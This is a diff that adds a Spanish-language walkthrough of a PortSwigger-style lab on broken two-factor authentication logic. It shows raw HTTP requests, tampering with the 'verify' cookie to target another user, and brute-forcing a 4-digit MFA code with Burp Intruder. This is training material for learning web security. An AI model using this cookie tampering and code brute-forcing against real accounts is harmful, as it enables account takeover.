@@ -265,3 +265,76 @@ otrouser:123456
 Osea que genera 5 payloads de cada usuario y agrega un null al ultimo lo que genera que se bloquee la cuenta con un mensaje de "Hiciste demaciados intentos"
 Finalmente teniengo el user pues ya solo usas el sniper atack
 
+
+
+# 2FA broken logic
+
+Para este laboratorio es dificil de imaginar ( carlos nunca entra con sus credenciales) algo asi tienes que probar mucho pero los pasos fueron los siguientes:
+
+1. Primero nos vamos a la cuenta de weiner nos damos cuenta de las peticiones que usa
+
+```
+
+POST /login HTTP/1.1
+Host: 0a6c003303fc3a9dc09d2fd500220072.web-security-academy.net
+Cookie: verify=wiener; session=WXeIfLTaEjhGXW3b7MmcZknRpooiPSS2
+
+```
+2. Despues hace esta 
+
+
+```
+GET /login2 HTTP/1.1
+Host: 0a6c003303fc3a9dc09d2fd500220072.web-security-academy.net
+Cookie: verify=wiener; session=W4aVvCMA6PRsJVnwGGeAKe46NRRRNsrK
+Cache-Control: max-age=0
+
+```
+
+3. Paso 3 mandas al Repeter la peticon de GET y le cambias el usuario de wiener a carlos y la mandas esto hace que se genere un mfa 
+de la cuenta de carlos
+
+4. Sales de la cuenta de wiener
+
+5. Entras de nuevo a la cuenta de wiener y vas a poner mal el mfa para ver que peticion esta generando y posteriormente mandarla a intruder
+
+```
+
+POST /login2 HTTP/1.1
+Host: 0a6c003303fc3a9dc09d2fd500220072.web-security-academy.net
+Cookie: verify=wiener; session=W4aVvCMA6PRsJVnwGGeAKe46NRRRNsrK
+Content-Length: 13
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0a6c003303fc3a9dc09d2fd500220072.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a6c003303fc3a9dc09d2fd500220072.web-security-academy.net/login2
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+mfa-code=1234
+
+```
+
+Genera esa peticion osea que se manda al intruder y se ataca
+
+6. Modo de ataque "brute force" y como el numero es de 4 digitos de deja asi en el Intruder
+
+![Intruder autentication bypass](https://user-images.githubusercontent.com/63270579/193476529-d8382f30-a238-4e74-91a1-a97973a89233.PNG)
+
+7. Finalmente nos da una respuesta diferente esa respuesta la abrimos en el navegador y se resuelve el laboratorio.
+
+
+
+
+
